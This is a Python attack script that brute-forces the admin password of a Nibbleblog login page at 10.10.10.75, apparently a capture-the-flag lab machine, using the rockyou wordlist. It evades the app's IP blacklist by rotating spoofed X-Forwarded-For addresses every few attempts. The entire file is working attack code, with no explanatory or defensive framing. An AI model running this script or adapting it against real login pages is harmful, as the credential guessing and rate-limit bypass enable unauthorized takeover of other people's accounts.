from random import randint
import requests

# Brute force information
PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'
RATE_LIMIT = 5 # number of incorrect attempts target app will block the source IP
RATE_LIMIT_ERROR = 'Blacklist protection' # error app throws when IP is added to Blacklist
LOGIN_FAILED_ERROR = 'Incorrect username or password.' # error app throws when password is incorrect

# Target information
RHOST = '10.10.10.75' # target web app IP address
LOGIN_PAGE = '/nibbleblog/admin.php' # web login page that accept username and password
TARGET_URL = f'http://{RHOST}{LOGIN_PAGE}'
USERNAME = 'admin' # known username


def attempt_login(password: str, ip: str) -> bool:
    """Performs a login using a given password.

    :param password: The password to try.
    :param ip: Spoof the attacker's IP address with this one.
    :return: True for a successful login, otherwise False.
    """
    headers = {'X-Forwarded-For': ip}
    payload = {'username': USERNAME, 'password': password} # POST parameter as seen in Burp
    r = requests.post(
        TARGET_URL, headers=headers, data=payload
    )

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if RATE_LIMIT_ERROR in r.text:
        print("Rate limit hit, aborting!")
        exit(1)

    return LOGIN_FAILED_ERROR not in r.text


def random_ip() -> str:
    """Generate a random IP address.

    :return: A random IP address.
    """
    return ".".join(str(randint(0, 255)) for _ in range(4))


def run(start_at: int = 1):
    """Start the brute force process.

    :param start_at: Start brute forcing at the password with
     this 1-based index. The number represents the line in
     the password file.
    """
    ip: str = random_ip()
    num_attempts: int = 1

    for password in open(PASSWORD_LIST):
        if num_attempts < start_at:
            num_attempts += 1
            continue

        if num_attempts % (RATE_LIMIT - 1) == 0:
            ip = random_ip()

        password = password.strip()
        print(f"Attempt {num_attempts}: {ip}\t\t{password}")

        if attempt_login(password, ip):
            print(f"Password for {USERNAME} is {password}")
            break

        num_attempts += 1


if __name__ == '__main__':
    run()